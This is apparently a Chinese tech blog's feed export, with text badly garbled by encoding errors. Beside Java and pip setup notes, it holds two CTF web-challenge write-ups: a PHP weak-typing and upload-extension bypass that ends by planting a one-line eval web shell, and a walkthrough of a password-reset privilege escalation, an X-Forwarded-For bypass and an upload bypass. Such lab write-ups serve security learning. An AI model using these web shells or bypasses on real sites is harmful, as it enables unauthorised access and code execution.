AdoptOpenJDK/openjdk/adoptopenjdk10<br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk11<br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk12<br><br><span class="hljs-comment"># å®‰è£…æœ€æ–°ç‰ˆæœ¬ OpenJDK</span><br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk<br></code></pre></td></tr></table></figure><p>å®‰è£…ç›®å½•é€šå¸¸åœ¨<code>/Library/Java/JavaVirtualMachines</code>ä¸‹ï¼Œåœ¨é…ç½® jEnv çš„æ—¶å€™éœ€è¦ä½¿ç”¨ JDK çš„ HOME ç›®å½•ã€‚</p><h2 id="2-2-é…ç½®jEnv"><a href="#2-2-é…ç½®jEnv" class="headerlink" title="2.2 é…ç½®jEnv"></a>2.2 é…ç½®jEnv</h2><p>æŸ¥çœ‹å½“å‰ jEnv å¯ç®¡ç†çš„ Java ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ jenv versions<br>  system<br>  oracle64-1.6.0.39<br>* oracle64-1.7.0.11 (<span class="hljs-built_in">set</span> by /Users/hikage/.jenv/version)<br></code></pre></td></tr></table></figure><p>å°† JDK çš„ HOME ç›®å½•æ·»åŠ åˆ° jEnv ä¸­ï¼Œåªéœ€è¦æ·»åŠ ä¸€æ¬¡ï¼Œä»¥åå°±å¯ä»¥ç§’æ¢ Java ç¯å¢ƒã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home<br></code></pre></td></tr></table></figure><p>å†æ¬¡ä½¿ç”¨<code>jenv versions</code>åï¼Œå°±å¯ä»¥çœ‹åˆ°åˆšåˆšæ·»åŠ çš„ Java çš„ç‰ˆæœ¬å·ã€‚</p><h2 id="2-3-åˆ‡æ¢-Java-ç‰ˆæœ¬"><a href="#2-3-åˆ‡æ¢-Java-ç‰ˆæœ¬" class="headerlink" title="2.3 åˆ‡æ¢ Java ç‰ˆæœ¬"></a>2.3 åˆ‡æ¢ Java ç‰ˆæœ¬</h2><p>é…ç½®å…¨å±€çš„ JDK ç‰ˆæœ¬ï¼ŒæŠŠä¸‹é¢çš„<code>oracle64-1.6.0.39</code>æ›¿æ¢æˆä½ çš„ jEnv åˆ—å‡ºçš„ JDK çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚ï¼ˆå¦‚æœä¸ç¡®å®šçš„è¯ï¼Œå¯ä»¥åˆ°æœ€ä¸‹é¢çœ‹æ•ˆæœå›¾ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ jenv global oracle64-1.6.0.39<br></code></pre></td></tr></table></figure><p>é…ç½®å±€éƒ¨çš„ JDK ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ jenv <span class="hljs-built_in">local</span> oracle64-1.6.0.39<br></code></pre></td></tr></table></figure><h1 id="3-æœ€åçš„æ•ˆæœ"><a href="#3-æœ€åçš„æ•ˆæœ" class="headerlink" title="3 æœ€åçš„æ•ˆæœ"></a>3 æœ€åçš„æ•ˆæœ</h1><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210104200111.png"></p><p>å‚è€ƒåšå®¢ï¼š</p><ol><li><a href="https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html">https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html</a></li><li><a href="https://www.jianshu.com/p/1a147d5515f0">https://www.jianshu.com/p/1a147d5515f0</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-ics-07</title>
    <link href="/2020/12/29/2020%E5%B9%B412%E6%9C%8829%E6%97%A5-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-07/"/>
    <url>/2020/12/29/2020%E5%B9%B412%E6%9C%8829%E6%97%A5-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-07/</url>
    
    <content type="html"><![CDATA[<h1 id="1-æºç å®¡è®¡"><a href="#1-æºç å®¡è®¡" class="headerlink" title="1 æºç å®¡è®¡"></a>1 æºç å®¡è®¡</h1><p>æ‰“å¼€ç½‘ç«™è¿›è¡Œä½“éªŒè¿‡åï¼Œå‘ç°åœ¨ã€Œé¡¹ç›®ç®¡ç†ã€ä½ç½®å¯ä»¥ç‚¹å‡»ï¼Œè¿›å…¥åå¯ä»¥æŸ¥çœ‹è¯¥ç½‘é¡µçš„æºç ã€‚ä½¿ç”¨F12åå¹¶æ— å…¶ä»–å¼‚å¸¸æƒ…å†µã€‚ä½¿ç”¨ dirsearchè¿›è¡Œæ‰«ç›®å½•</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-number">10</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">1</span>KB - /index.php  -&gt;  ?page=flag.php<br>[<span class="hljs-number">10</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">74</span>B  - /flag.php<br>[<span class="hljs-number">10</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /config.php<br>[<span class="hljs-number">10</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - /index.html<br></code></pre></td></tr></table></figure><p>å¯¹ç½‘ç«™çš„æºç è¿›è¡Œå¤§è‡´çš„åˆ†æï¼Œå¹¶è¿›è¡Œæ³¨é‡Šã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;title&gt;cetc7&lt;/title&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    session_start();<br><br>    <span class="hljs-comment">// è®¾ç½®æœªpageå‚æ•°</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[page])) &#123;<br>        show_source(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-comment">// è®¾ç½®pageå‚æ•°ï¼Œå¹¶ä¸”pageä¸ç­‰äºindex.php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[page]) &amp;&amp; $_GET[page] != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        header(<span class="hljs-string">&#x27;Location: ?page=flag.php&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">?&gt;</span><br>    &lt;!-- pageå’Œidçš„è¡¨å• --&gt;<br>    &lt;form action=<span class="hljs-string">&quot;#&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>        page : &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;page&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;<br>        id : &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>    &lt;br /&gt;<br>    &lt;a href=<span class="hljs-string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;<br><br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;admin&#x27;</span>]) &#123;<br>        $con = $_POST[<span class="hljs-string">&#x27;con&#x27;</span>];<br>        $file = $_POST[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        $filename = <span class="hljs-string">&quot;backup/&quot;</span> . $file;<br><br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, $filename)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bad file extension&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            chdir(<span class="hljs-string">&#x27;uploaded&#x27;</span>);<br>            $f = fopen($filename, <span class="hljs-string">&#x27;w&#x27;</span>);<br>            fwrite($f, $con);<br>            fclose($f);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br> <br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// è®¾ç½®idå‚æ•°ã€idä¸ç­‰äº1ã€idçš„å€’æ•°ç¬¬ä¸€ä¸ªä½ç½®ä¸º9</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; substr($_GET[id], <span class="hljs-number">-1</span>) === <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br>        $id = mysql_real_escape_string($_GET[id]);<br>        $sql = <span class="hljs-string">&quot;select * from cetc007.user where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br>        $result = mysql_query($sql);<br>        $result = mysql_fetch_object($result);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $result = <span class="hljs-literal">False</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!$result) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);<br>    <span class="hljs-keyword">if</span> ($result) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id: &quot;</span> . $result-&gt;id . <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;name:&quot;</span> . $result-&gt;user . <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        $_SESSION[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">True</span>;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br><br>&lt;/body&gt;<br><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>åˆ†æè¿‡åï¼Œèƒ½å°†è¿™ä¸ªæºç åˆ†ä¸º3ä¸ªéƒ¨åˆ†ï¼š</p><ol><li>åŒ…å«flagæ–‡ä»¶ã€‚éœ€è¦è°ƒæ•´<code>page</code>å‚æ•°</li><li>è¿›è¡Œæ–‡ä»¶å†™å…¥ã€‚éœ€è¦è°ƒæ•´<code>$_SESSION[&#39;admin&#39;]</code>ã€<code>$_POST[&#39;con&#39;]</code>ã€<code>$_POST[&#39;file&#39;]</code>ä¸‰ä¸ªå‚æ•°ã€‚</li><li>å°†<code>$_SESSION[&#39;admin&#39;]</code> è®¾ç½®ä¸ºtrueã€‚è°ƒæ•´<code>id</code>å‚æ•°</li></ol><h1 id="2-phpå¼±ç±»å‹"><a href="#2-phpå¼±ç±»å‹" class="headerlink" title="2 phpå¼±ç±»å‹"></a>2 phpå¼±ç±»å‹</h1><p>éœ€è¦å…ˆä½¿å¾—<code>$_SESSION[&#39;admin&#39;]=true</code>ï¼Œæ•…å…ˆé’ˆå¯¹ç¬¬ä¸‰éƒ¨åˆ†è¿›è¡Œå¤„ç†ã€‚</p><ul><li>floatvalå‡½æ•°ï¼šè·å–å˜é‡çš„æµ®ç‚¹å€¼ã€‚</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161435469.png" alt="image-20201229161435469"></p><p>å½“floatvalå‡½æ•°é‡åˆ°å­—ç¬¦ä¸²æ—¶ï¼Œä¼šè‡ªåŠ¨æˆªæ–­åé¢çš„å†…å®¹ã€‚</p><ul><li>substrå‡½æ•°ï¼šè¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161406321.png" alt="image-20201229161406321"></p><p>substrä¸ºè´Ÿæ•°æ—¶ï¼ŒæŒ‰æ•°ç»„ä»ååˆ°å‰è¾“å‡ºã€‚æ•…ä½¿å¾—<code>id=1 9</code>å³å¯ï¼Œ1å’Œ9ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161844300.png" alt="image-20201229161844300"></p><h1 id="3-phpä¸Šä¼ åç¼€ç»•è¿‡"><a href="#3-phpä¸Šä¼ åç¼€ç»•è¿‡" class="headerlink" title="3 phpä¸Šä¼ åç¼€ç»•è¿‡"></a>3 phpä¸Šä¼ åç¼€ç»•è¿‡</h1><p>å°è¯•ä¸Šä¼ æ­£å¸¸çš„æ–‡ä»¶ã€‚</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229162616156.png" alt="image-20201229162616156"></p><p>ç„¶åè¿›å…¥<code> /uploaded/backup</code>ç›®å½•å³å¯çœ‹è§1.txtã€‚</p><p>ç„¶åéœ€è¦åˆ©ç”¨ Linux çš„ç‰¹æ€§è¿›è¡Œç»•è¿‡åç¼€ã€‚å°†æ–‡ä»¶åå‘½åä¸º <code>a.php/b.php/..</code>  ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br>$filename = <span class="hljs-string">&#x27;a.php/b.php/..&#x27;</span>;<br>$f = fopen($filename, <span class="hljs-string">&#x27;w&#x27;</span>);<br>fwrite($f, $con);<br>fclose($f);<br><br></code></pre></td></tr></table></figure><p>è¿™ç§æ–‡ä»¶ååœ¨phpä¸­ä¼šè¢«è§£æä¸º a.phpï¼ˆå¯ä»¥å…ˆå°†<code>a.php</code>å’Œ<code>b.php</code>çœ‹è§æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨<code>..</code>ä¼šå›åˆ°ä¸Šä¸€ä¸ªæ–‡ä»¶å¤¹ï¼‰ï¼Œç¨‹åºæœ€åä¼šåˆ›å»ºä¸€ä¸ªa.phpã€‚</p><p>ç»¼åˆä¸Šé¢çš„ç»“è®ºï¼Œ<code>con</code>ä¸ºphpçš„å†…å®¹ï¼Œ<code>file</code>ä¸ºphpæ–‡ä»¶åã€‚æŠŠæ–‡ä»¶åå‘½åä¸º <code>a.php/b.php/..</code>ï¼Œå¦‚ä¸‹é…ç½®ï¼š<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229163357690.png" alt="image-20201229163357690"></p><p>æœ€åè®¿é—® <a href="http://220.249.52.134:46528/uploaded/backup/a.php">http://220.249.52.134:46528/uploaded/backup/a.php</a> å³å¯ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229163655879.png" alt="image-20201229163655879"></p><p>æœ€åå†™å…¥ä¸€å¥è¯ï¼Œä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">con=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[pwd]);<span class="hljs-meta">?&gt;</span>&amp;&amp;file=b.php/b.php/..<br></code></pre></td></tr></table></figure><p>æœ€åé€šè¿‡å‘½ä»¤å³å¯æ‰¾åˆ°flagã€‚</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229164218161.png" alt="image-20201229164218161"></p><p>å‚è€ƒï¼š</p><ol><li><a href="https://www.cnblogs.com/zhengna/p/13452813.html">https://www.cnblogs.com/zhengna/p/13452813.html</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>phpå¼±ç±»å‹</tag>
      
      <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-bug</title>
    <link href="/2020/12/27/2020%E5%B9%B412%E6%9C%8827%E6%97%A5-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bug/"/>
    <url>/2020/12/27/2020%E5%B9%B412%E6%9C%8827%E6%97%A5-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bug/</url>
    
    <content type="html"><![CDATA[<h1 id="1-è¶Šæƒæ”¹å¯†ç "><a href="#1-è¶Šæƒæ”¹å¯†ç " class="headerlink" title="1 è¶Šæƒæ”¹å¯†ç "></a>1 è¶Šæƒæ”¹å¯†ç </h1><p>å¤§æ¦‚ç†Ÿæ‚‰ä¸€ä¸‹æ•´ä¸ªç½‘ç«™çš„åŠŸèƒ½ã€‚</p><ol><li>æ³¨å†Œ</li><li>æ‰¾å›å¯†ç </li><li>ç™»é™†</li><li>æŸ¥è¯¢ä¸ªäººä¿¡æ¯</li></ol><p><strong>æµ‹è¯•æ³¨å†ŒåŠŸèƒ½</strong>ã€‚æˆ‘ä½¿ç”¨SQLmapæµ‹è¯•æ˜¯å¦æœ‰SQLæ³¨å…¥ï¼Œå‘ç°å¹¶æ²¡æœ‰æ‰¾åˆ°æ³¨å…¥ã€‚æ³¨å†Œç‚¹å¯èƒ½ä¼šæœ‰äºŒæ¬¡æ³¨å…¥ï¼Œä½¿ç”¨SQLmapæµ‹ä¸å‡ºæ¥å°±å°è¯•ä¸‹ä¸€ä¸ªç‚¹ã€‚</p><p><strong>æµ‹è¯•æ‰¾å›å¯†ç åŠŸèƒ½</strong>ã€‚é¦–å…ˆæ˜¯å°†ç”¨æˆ·ä¿¡æ¯è¿›è¡Œè¾“å…¥ï¼Œç„¶åè¾“å…¥æ–°å¯†ç ã€‚æŸ¥çœ‹æºç èƒ½çœ‹è§å½“å‰æ­£åœ¨æ‰¾å›çš„ç”¨æˆ·å<code>1</code></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227225311710.png" alt="image-20201227225311710"></p><p>å¡«å…¥æ–°å¯†ç åï¼ŒHTTPè¯·æ±‚å¤´ä¼šåŒæ—¶å‘é€ç”¨æˆ·åå’Œå¯†ç ã€‚å¦‚æœç³»ç»Ÿç”¨æ­¤æ—¶çš„ç”¨æˆ·åæ¥ä¿®æ”¹å¯†ç ï¼Œé‚£å°±å¯ä»¥è¿›è¡Œè¶Šæƒæ“ä½œã€‚</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227225242767.png" alt="image-20201227225242767"></p><p>å°è¯•ä¿®æ”¹ç”¨æˆ·åä¸ºadminï¼Œæ–°å¯†ç ä¸ºadminï¼Œå‘é€åä¿®æ”¹æˆåŠŸï¼ˆæ­¤å¤„å­˜åœ¨è¶Šæƒï¼‰ã€‚</p><p><strong>æµ‹è¯•ç™»é™†åŠŸèƒ½</strong>ã€‚SQLmapæ²¡ååº”ã€‚</p><p><strong>æµ‹è¯•æŸ¥è¯¢ä¸ªäººä¿¡æ¯</strong>ã€‚æ‰‹åŠ¨è¿›è¡Œsqlæ³¨å…¥é—­åˆï¼Œæ— ååº”ã€‚å°è¯•è¿›è¡Œä¿®æ”¹UIDï¼Œå¹¶æœªå¾—åˆ°å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ã€‚</p><p>å…¶ä»–å¤§ä½¬è¿˜æ³¨æ„åˆ°äº†Cookieçš„å¼‚å¸¸ã€‚</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227230553008.png" alt="image-20201227230553008"></p><p>å°†<code>4b9987ccafacb8d8fc08d22bbca797ba</code>æœ‰ç‚¹ç±»ä¼¼MD5ï¼Œåœ¨SOMD5è¿›è¡Œè§£å¯†åå¾—<code>1:admin</code>ã€‚ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹Cookieçš„æ–¹å¼è¿›è¡Œè¶Šæƒã€‚</p><h1 id="2-X-Forward-Forç»•è¿‡IPæ£€æµ‹"><a href="#2-X-Forward-Forç»•è¿‡IPæ£€æµ‹" class="headerlink" title="2 X-Forward-Forç»•è¿‡IPæ£€æµ‹"></a>2 X-Forward-Forç»•è¿‡IPæ£€æµ‹</h1><p>ç™»é™†ååªå‰©manageåŠŸèƒ½æ²¡æœ‰è¿›è¡Œæµ‹è¯•äº†ï¼Œç‚¹å‡»ä¹‹åæç¤ºIPé”™è¯¯ã€‚é‡åˆ° IP é™åˆ¶ï¼Œé€šå¸¸æœ‰2ä¸ªæ€è·¯ï¼ˆå¤§ä½¬åº”è¯¥æ›´å¤šï¼‰ã€‚</p><ol><li>X-Forward-Forï¼šä½¿ç”¨Chromeçš„modheaderå·¥å…·</li><li>SSRFï¼šæ‰¾æºç æˆ–è€…å…¶ä»–æ¼æ´è¿›è¡ŒSSRFï¼Œè¿›è¡Œæœ¬åœ°æ–‡ä»¶è¯»å–æˆ–è€…å…¶ä»–æ“ä½œã€‚</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227231106321.png" alt="image-20201227231106321"></p><h1 id="3-æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"><a href="#3-æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="headerlink" title="3 æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"></a>3 æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</h1><p>æˆåŠŸç»•è¿‡IPæ£€æµ‹åï¼Œèƒ½çœ‹è§ä¾§ç€çš„ç¬‘è„¸å’ŒWhere Is The Flag?çš„å­—æ ·ã€‚åœ¨æºç ä¸­éšè—äº†å¦ä¸€ä¸ªä¿¡æ¯<code>index.php?module=filemanage&amp;do=???</code>.æ–‡ä»¶ç±»å‹çš„actioné€šå¸¸éƒ½æ˜¯uploadï¼Œæ•…è®¿é—®<code>index.php?module=filemanage&amp;do=upload</code>é¡µé¢ï¼Œåœ¨æ–°é¡µé¢ä¸­èƒ½è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚</p><ol><li>é€‰æ‹©å›¾ç‰‡è¿›è¡Œä¸Šä¼ ã€‚</li><li>ä½¿ç”¨BurpSuiteæŠ“åŒ…ä¿®æ”¹å†…å®¹ã€‚<ol><li>å°†æ–‡ä»¶åç¼€æ”¹ä¸ºphp5æˆ–php4</li><li>å°†æ–‡ä»¶å†…å®¹ä¿®æ”¹ä¸º<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code></li></ol></li><li>å‘é€å³å¯å¾—åˆ°flag</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227232259360.png" alt="image-20201227232259360"></p><p>å‚è€ƒï¼š</p><ol><li><a href="https://www.cnblogs.com/gaonuoqi/p/11692694.html">https://www.cnblogs.com/gaonuoqi/p/11692694.html</a></li><li><a href="https://blog.csdn.net/weixin_42499640/article/details/98793342">https://blog.csdn.net/weixin_42499640/article/details/98793342</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>æ”»é˜²ä¸–ç•Œ</tag>
      
      <tag>æ°´å¹³è¶Šæƒ</tag>
      
      <tag>XFFä¼ªé€ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³macä¸­pip3å¯¹åº”python2</title>
    <link href="/2020/12/21/2020%E5%B9%B412%E6%9C%8821%E6%97%A5-%E8%A7%A3%E5%86%B3mac%E4%B8%ADpip3%E5%AF%B9%E5%BA%94python2/"/>
    <url>/2020/12/21/2020%E5%B9%B412%E6%9C%8821%E6%97%A5-%E8%A7%A3%E5%86%B3mac%E4%B8%ADpip3%E5%AF%B9%E5%BA%94python2/</url>
    
    <content type="html"><![CDATA[<h1 id="è§£å†³macä¸­pip3å¯¹åº”python2ï¼ˆpipæŒ‡å‘é—®é¢˜ï¼‰"><a href="#è§£å†³macä¸­pip3å¯¹åº”python2ï¼ˆpipæŒ‡å‘é—®é¢˜ï¼‰" class="headerlink" title="è§£å†³macä¸­pip3å¯¹åº”python2ï¼ˆpipæŒ‡å‘é—®é¢˜ï¼‰"></a>è§£å†³macä¸­pip3å¯¹åº”python2ï¼ˆpipæŒ‡å‘é—®é¢˜ï¼‰</h1><h2 id="åŒç†å¯ä»¥è§£å†³-pip-å¯¹åº”-Python3-çš„é—®é¢˜ã€‚"><a href="#åŒç†å¯ä»¥è§£å†³-pip-å¯¹åº”-Python3-çš„é—®é¢˜ã€‚" class="headerlink" title="åŒç†å¯ä»¥è§£å†³ pip å¯¹åº” Python3 çš„é—®é¢˜ã€‚"></a>åŒç†å¯ä»¥è§£å†³ pip å¯¹åº” Python3 çš„é—®é¢˜ã€‚</h2><h1 id="ä¸€ã€é—®é¢˜"><a href="#ä¸€ã€é—®é¢˜" class="headerlink" title="ä¸€ã€é—®é¢˜"></a>ä¸€ã€é—®é¢˜</h1><p>åœ¨ mac ä¸­æŸ¥çœ‹ pip å’Œ pip3 çš„ç‰ˆæœ¬ï¼Œå…¶ä¸­ pip3 å¯¹åº”çš„ Python ç‰ˆæœ¬æ˜¯ 2.7</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201221215802703.png" alt="image-20201221215802703"></p><p>æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥æ˜¯ï¼špipå¯¹åº”Python2ï¼Œpip3å¯¹åº”Python3ã€‚</p><h1 id="äºŒã€è§£å†³"><a href="#äºŒã€è§£å†³" class="headerlink" title="äºŒã€è§£å†³"></a>äºŒã€è§£å†³</h1><p>ä½¿ç”¨whichå¯ä»¥æŸ¥çœ‹æŒ‡ä»¤pipçš„ç»å¯¹è·¯å¾„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ Â» <span class="hljs-built_in">which</span> pip                <br>/usr/<span class="hljs-built_in">local</span>/bin/pip<br></code></pre></td></tr></table></figure><p>åœ¨macä¸­ä½¿ç”¨easy_installå®‰è£…pipä¼šå¯¼è‡´pipå’Œpip3éƒ½å˜æˆpip</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 